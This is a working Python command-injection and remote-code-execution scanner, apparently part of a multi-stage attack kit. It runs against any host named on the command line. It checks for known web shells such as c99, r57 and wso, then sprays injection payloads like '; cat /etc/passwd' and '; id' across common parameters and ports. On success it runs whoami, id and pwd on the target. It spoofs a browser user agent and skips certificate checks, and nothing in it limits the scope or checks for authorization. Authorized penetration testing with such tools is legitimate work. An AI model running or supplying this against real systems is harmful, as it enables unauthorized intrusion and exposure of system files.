#!/usr/bin/env python3
"""TERMINAL 3: RCE & Command Injection Testing"""
import requests, sys, json, os, urllib.parse
from datetime import datetime
import warnings
warnings.filterwarnings('ignore')

class Colors:
    HEADER, OKBLUE, OKCYAN, OKGREEN, WARNING, FAIL, ENDC, BOLD = '\033[95m', '\033[94m', '\033[96m', '\033[92m', '\033[93m', '\033[91m', '\033[0m', '\033[1m'

class RCETester:
    def __init__(self, target, workspace="/tmp"):
        self.target, self.workspace = target, workspace
        self.results_file = f"{workspace}/results/rce_scan.json"
        self.session = requests.Session()
        self.session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        self.vulnerabilities = []
        self.marker = "RCE_MARKER_987654"
        self.payloads = [f";echo {self.marker}", f"|echo {self.marker}", f"`echo {self.marker}`",
            f"$(echo {self.marker})", f"&& echo {self.marker}", "; id", "| id", "; whoami", "| whoami",
            "; uname -a", "| uname -a", "; cat /etc/passwd", "| cat /etc/passwd", "; dir", "| dir",
            "; type C:\\windows\\win.ini", "| type C:\\windows\\win.ini", "; sleep 5", "| sleep 5"]
        self.indicators = [self.marker, "uid=", "gid=", "root:", "www-data", "daemon:", "Administrator",
            "SYSTEM", "Volume in drive", "Directory of", "# uname", "# whoami", "# id"]
        self.params = ['cmd', 'command', 'exec', 'execute', 'ping', 'query', 'code', 'input', 'system', 
            'shell', 'call', 'func', 'page', 'file', 'path', 'action', 'name', 'ip', 'host']
        print(f"""{Colors.HEADER}\n╔══════════════════════════════════════════════════════════════════╗\n║     TERMINAL 3: REMOTE CODE EXECUTION & COMMAND INJECTION        ║\n╚══════════════════════════════════════════════════════════════════╝{Colors.ENDC}\nTarget: {target} | Payloads: {len(self.payloads)} | Marker: {self.marker}""")

    def get_urls(self):
        urls, paths = [], ['', '/', '/index.php', '/ping.php', '/exec.php', '/shell.php', '/cmd.php',
            '/command.php', '/api/execute', '/console', '/debug', '/webshell.php']
        for p in ['http', 'https']:
            for path in paths:
                urls.append(f"{p}://{self.target}{path}")
        for port in [80, 443, 8080, 8443, 3000, 5000, 8000]:
            proto = 'https' if port in [443, 8443] else 'http'
            for path in paths[:8]:
                urls.append(f"{proto}://{self.target}:{port}{path}")
        return urls

    def test_rce(self, url, param, payload):
        try:
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            r = self.session.get(test_url, timeout=20, verify=False, allow_redirects=False)
            for ind in self.indicators:
                if ind in r.text:
                    return {'type': 'RCE', 'url': test_url, 'param': param, 'payload': payload,
                        'evidence': r.text[max(0, r.text.find(ind)-30):r.text.find(ind)+30].replace('\n', ' '),
                        'status': r.status_code, 'severity': 'Critical'}
        except requests.exceptions.Timeout:
            if 'sleep' in payload.lower():
                return {'type': 'Blind RCE', 'url': test_url, 'param': param, 'payload': payload,
                    'evidence': 'Timeout - potential blind RCE', 'status': 0, 'severity': 'High'}
        except: pass
        return None

    def run(self):
        print(f"\n{Colors.BOLD}[PHASE 1] Testing Common Web Shells{Colors.ENDC}")
        shells = ['/shell.php', '/cmd.php', '/c99.php', '/r57.php', '/backdoor.php', '/wso.php']
        for p in ['http', 'https']:
            for port in [80, 443, 8080]:
                for shell in shells:
                    url = f"{p}://{self.target}:{port}{shell}" if port not in [80, 443] else f"{p}://{self.target}{shell}"
                    try:
                        r = self.session.get(url, timeout=10, verify=False)
                        if r.status_code == 200 and any(i in r.text.lower() for i in ['shell', 'cmd', 'root:', 'uid=']):
                            print(f"{Colors.FAIL}[!] Potential Shell: {url}{Colors.ENDC}")
                    except: pass

        print(f"\n{Colors.BOLD}[PHASE 2] Command Injection Testing{Colors.ENDC}\n")
        for url in self.get_urls()[:15]:
            print(f"{Colors.OKBLUE}[*] Testing: {url}{Colors.ENDC}")
            for param in self.params[:12]:
                for payload in self.payloads[:18]:
                    result = self.test_rce(url, param, payload)
                    if result:
                        self.vulnerabilities.append(result)
                        print(f"{Colors.FAIL}[!] RCE FOUND!{Colors.ENDC}\n  {result['url']}\n  Evidence: {result['evidence'][:80]}...")
                        for cmd, desc in [("; whoami", "User"), ("; id", "ID"), ("; pwd", "Dir")]:
                            try:
                                r = self.session.get(f"{url}?{param}={urllib.parse.quote(cmd)}", timeout=15, verify=False)
                                print(f"    {Colors.OKCYAN}{desc}:{Colors.ENDC} {r.text[:60].strip()}")
                            except: pass
                        break
                if self.vulnerabilities:
                    break
            if len(self.vulnerabilities) >= 3:
                break

        os.makedirs(os.path.dirname(self.results_file), exist_ok=True)
        with open(self.results_file, 'w') as f:
            json.dump({'target': self.target, 'time': datetime.now().isoformat(),
                'vulns': self.vulnerabilities, 'count': len(self.vulnerabilities)}, f, indent=2)
        print(f"{Colors.OKGREEN}[+] Results: {self.results_file}{Colors.ENDC}")
        print(f"{Colors.HEADER}{'='*60}{Colors.ENDC}\n{Colors.BOLD}RCE Scan Complete{Colors.ENDC} | Found: {len(self.vulnerabilities)}{Colors.ENDC}\n")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: terminal3_rce.py <target>")
        sys.exit(1)
    RCETester(sys.argv[1], sys.argv[2] if len(sys.argv) > 2 else "/tmp").run()
